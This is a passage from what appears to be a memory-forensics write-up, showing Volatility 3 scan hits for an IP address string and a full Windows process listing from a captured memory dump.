</span></span><span style="display:flex;"><span>0x5ebd97        <span style="color:#bd93f9">9880</span>    r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>0x240342b       <span style="color:#bd93f9">9880</span>    r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>0x2495c9741cd   <span style="color:#bd93f9">6772</span>    r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>0x2495ca7531f   <span style="color:#bd93f9">6772</span>    r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>0x2495ce0690b   <span style="color:#bd93f9">6772</span>    r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>0x2495ce075c3   <span style="color:#bd93f9">6772</span>    r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>0x2495ce1ae28   <span style="color:#bd93f9">6772</span>    r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>0x2495ce1aea0   <span style="color:#bd93f9">6772</span>    r1      <span style="color:#8be9fd;font-style:italic">$a</span>      <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">39</span> <span style="color:#bd93f9">32</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">36</span> <span style="color:#bd93f9">38</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">37</span> 2e <span style="color:#bd93f9">31</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">31</span>
</span></span></code></pre></div><p>Than I did a <code>pslist</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ vol3 -f memory_dump.vmem windows.pslist                                    
</span></span><span style="display:flex;"><span>Volatility <span style="color:#bd93f9">3</span> Framework 2.7.1
</span></span><span style="display:flex;"><span>Progress:  100.00               PDB scanning finished                        
</span></span><span style="display:flex;"><span>PID     PPID    ImageFileName   Offset<span style="color:#ff79c6">(</span>V<span style="color:#ff79c6">)</span>       Threads Handles SessionId       Wow64   CreateTime      ExitTime        File output
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">4</span>       <span style="color:#bd93f9">0</span>       System  0xc40aa0e85280  <span style="color:#bd93f9">103</span>     -       N/A     False   2023-10-31 13:30:55.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">88</span>      <span style="color:#bd93f9">4</span>       Registry        0xc40aa0ee7080  <span style="color:#bd93f9">4</span>       -       N/A     False   2023-10-31 13:30:50.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">280</span>     <span style="color:#bd93f9">4</span>       smss.exe        0xc40aa1cb12c0  <span style="color:#bd93f9">2</span>       -       N/A     False   2023-10-31 13:30:55.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">392</span>     <span style="color:#bd93f9">384</span>     csrss.exe       0xc40aa1c32140  <span style="color:#bd93f9">11</span>      -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:56.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">472</span>     <span style="color:#bd93f9">384</span>     wininit.exe     0xc40aa484e080  <span style="color:#bd93f9">1</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:56.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">620</span>     <span style="color:#bd93f9">472</span>     services.exe    0xc40aa49a90c0  <span style="color:#bd93f9">8</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:56.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">636</span>     <span style="color:#bd93f9">472</span>     lsass.exe       0xc40aa49cd0c0  <span style="color:#bd93f9">8</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:56.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">740</span>     <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa503b280  <span style="color:#bd93f9">1</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:57.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">776</span>     <span style="color:#bd93f9">472</span>     fontdrvhost.ex  0xc40aa50a2180  <span style="color:#bd93f9">5</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:57.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">796</span>     <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa50ad280  <span style="color:#bd93f9">12</span>      -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:57.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">880</span>     <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa510d300  <span style="color:#bd93f9">13</span>      -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:57.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">936</span>     <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa517f280  <span style="color:#bd93f9">5</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:57.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">764</span>     <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa521b300  <span style="color:#bd93f9">2</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:57.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">396</span>     <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa539e340  <span style="color:#bd93f9">3</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:57.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1032</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa539f080  <span style="color:#bd93f9">7</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:57.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1040</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa53a0080  <span style="color:#bd93f9">2</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:57.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1096</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa53e32c0  <span style="color:#bd93f9">1</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:57.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1104</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa53e5340  <span style="color:#bd93f9">3</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:57.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1208</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa5421280  <span style="color:#bd93f9">6</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:57.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1292</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa546a280  <span style="color:#bd93f9">6</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:57.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1332</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa546d340  <span style="color:#bd93f9">8</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:57.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1356</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa5470340  <span style="color:#bd93f9">2</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:57.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1404</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa54b54c0  <span style="color:#bd93f9">8</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:57.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1468</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa0f4f080  <span style="color:#bd93f9">3</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:57.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1476</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa5527300  <span style="color:#bd93f9">1</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:57.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1548</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa552c340  <span style="color:#bd93f9">5</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:57.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1584</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa0eea080  <span style="color:#bd93f9">2</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:57.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1668</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa0eae080  <span style="color:#bd93f9">4</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:57.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1680</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa0ebb080  <span style="color:#bd93f9">3</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:57.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1696</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa0f93080  <span style="color:#bd93f9">3</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:57.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1804</span>    <span style="color:#bd93f9">4</span>       MemCompression  0xc40aa55a2080  <span style="color:#bd93f9">122</span>     -       N/A     False   2023-10-31 13:30:57.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1836</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa495e280  <span style="color:#bd93f9">2</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:57.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1852</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa55a7340  <span style="color:#bd93f9">7</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:57.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1876</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa55e4340  <span style="color:#bd93f9">10</span>      -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:57.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1928</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa561c2c0  <span style="color:#bd93f9">3</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:58.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1944</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa494e300  <span style="color:#bd93f9">6</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:58.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">984</span>     <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa56b0080  <span style="color:#bd93f9">11</span>      -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:58.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2052</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa5763300  <span style="color:#bd93f9">10</span>      -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:58.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2108</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa5769340  <span style="color:#bd93f9">3</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:58.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2128</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa576c080  <span style="color:#bd93f9">4</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:58.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2184</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa58472c0  <span style="color:#bd93f9">8</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:58.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2200</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa5848080  <span style="color:#bd93f9">6</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:58.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2328</span>    <span style="color:#bd93f9">620</span>     spoolsv.exe     0xc40aa58c3280  <span style="color:#bd93f9">7</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:58.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2352</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa58ca340  <span style="color:#bd93f9">2</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:58.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2396</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa58ec540  <span style="color:#bd93f9">14</span>      -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:58.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2440</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa595c340  <span style="color:#bd93f9">5</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:58.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2600</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa599f280  <span style="color:#bd93f9">23</span>      -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:58.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2884</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa5a772c0  <span style="color:#bd93f9">4</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:58.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">3196</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa5b86340  <span style="color:#bd93f9">5</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:59.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">3204</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa5b87080  <span style="color:#bd93f9">8</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:59.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">3212</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa5be1340  <span style="color:#bd93f9">15</span>      -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:59.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">3236</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa5c29280  <span style="color:#bd93f9">7</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:59.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">3292</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa5a63080  <span style="color:#bd93f9">7</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:59.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">3316</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa5c5e2c0  <span style="color:#bd93f9">3</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:59.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">3324</span>    <span style="color:#bd93f9">620</span>     vmtoolsd.exe    0xc40aa5c652c0  <span style="color:#bd93f9">11</span>      -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:59.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">3332</span>    <span style="color:#bd93f9">620</span>     VGAuthService.  0xc40aa5c60340  <span style="color:#bd93f9">2</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:59.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">3352</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa5c64080  <span style="color:#bd93f9">6</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:59.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">3360</span>    <span style="color:#bd93f9">620</span>     MsMpEng.exe     0xc40aa5c67380  <span style="color:#bd93f9">25</span>      -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:59.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">3568</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa5d4f340  <span style="color:#bd93f9">2</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:59.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">3608</span>    <span style="color:#bd93f9">796</span>     WmiPrvSE.exe    0xc40aa5d49080  <span style="color:#bd93f9">9</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:59.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">3728</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa5e0b300  <span style="color:#bd93f9">8</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:30:59.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">932</span>     <span style="color:#bd93f9">620</span>     dllhost.exe     0xc40aa5fc4080  <span style="color:#bd93f9">10</span>      -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:31:00.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">4688</span>    <span style="color:#bd93f9">620</span>     msdtc.exe       0xc40aa61ca0c0  <span style="color:#bd93f9">9</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:31:02.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">3928</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa62dc080  <span style="color:#bd93f9">2</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:31:03.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">4104</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa630c2c0  <span style="color:#bd93f9">8</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:31:03.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">5156</span>    <span style="color:#bd93f9">620</span>     SearchIndexer.  0xc40aa65b90c0  <span style="color:#bd93f9">18</span>      -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:31:05.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">5692</span>    <span style="color:#bd93f9">620</span>     NisSrv.exe      0xc40aa66430c0  <span style="color:#bd93f9">4</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:31:08.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">6408</span>    <span style="color:#bd93f9">796</span>     MicrosoftEdge.  0xc40aa6d350c0  <span style="color:#bd93f9">0</span>       -       <span style="color:#bd93f9">1</span>       False   2023-10-31 13:31:11.000000      2023-10-31 13:31:23.000000      Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">6756</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa6f0e540  <span style="color:#bd93f9">1</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:31:11.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">7192</span>    <span style="color:#bd93f9">5156</span>    SearchProtocol  0xc40aa70cc080  <span style="color:#bd93f9">9</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:31:13.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">7320</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa715e340  <span style="color:#bd93f9">5</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:31:13.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">7616</span>    <span style="color:#bd93f9">2920</span>    GoogleCrashHan  0xc40aa636e080  <span style="color:#bd93f9">3</span>       -       <span style="color:#bd93f9">0</span>       True    2023-10-31 13:31:15.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">7624</span>    <span style="color:#bd93f9">2920</span>    GoogleCrashHan  0xc40aa63f5080  <span style="color:#bd93f9">3</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:31:15.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">8140</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa51b4080  <span style="color:#bd93f9">5</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:31:20.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">5844</span>    <span style="color:#bd93f9">620</span>     SecurityHealth  0xc40aa6b85080  <span style="color:#bd93f9">13</span>      -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:31:23.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">4100</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa694d080  <span style="color:#bd93f9">1</span>       -       <span style="color:#bd93f9">0</span>       False   2023-10-31 13:32:21.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">3392</span>    <span style="color:#bd93f9">3308</span>    csrss.exe       0xc40aa4969080  <span style="color:#bd93f9">11</span>      -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:28.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">3800</span>    <span style="color:#bd93f9">3308</span>    winlogon.exe    0xc40aa6541080  <span style="color:#bd93f9">3</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:28.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">5996</span>    <span style="color:#bd93f9">3800</span>    fontdrvhost.ex  0xc40aa63ad080  <span style="color:#bd93f9">5</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:29.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">548</span>     <span style="color:#bd93f9">3800</span>    dwm.exe 0xc40aa5a8b080  <span style="color:#bd93f9">13</span>      -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:29.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2768</span>    <span style="color:#bd93f9">1404</span>    sihost.exe      0xc40aa5b2e080  <span style="color:#bd93f9">8</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:32.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">3280</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa6aee080  <span style="color:#bd93f9">3</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:32.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">5516</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa5a8f080  <span style="color:#bd93f9">2</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:32.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2848</span>    <span style="color:#bd93f9">1208</span>    taskhostw.exe   0xc40aa6195080  <span style="color:#bd93f9">6</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:32.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">7716</span>    <span style="color:#bd93f9">3800</span>    userinit.exe    0xc40aa71eb080  <span style="color:#bd93f9">0</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:32.000000      2023-10-31 13:32:56.000000      Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">7944</span>    <span style="color:#bd93f9">7716</span>    explorer.exe    0xc40aa64f4080  <span style="color:#bd93f9">52</span>      -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:32.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">7224</span>    <span style="color:#bd93f9">620</span>     svchost.exe     0xc40aa64bc080  <span style="color:#bd93f9">3</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:33.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">760</span>     <span style="color:#bd93f9">796</span>     ShellExperienc  0xc40aa63b4080  <span style="color:#bd93f9">29</span>      -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:33.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">532</span>     <span style="color:#bd93f9">796</span>     SearchUI.exe    0xc40aa5a24080  <span style="color:#bd93f9">26</span>      -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:34.000000      N/A     Disabled
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">6268</span>    <span style="color:#bd93f9">796</span>     RuntimeBroker.  0xc40aa715b540  <span style="color:#bd93f9">2</span>       -       <span style="color:#bd93f9">3</span>       False   2023-10-31 13:32:34.000000      N/A     Disabled
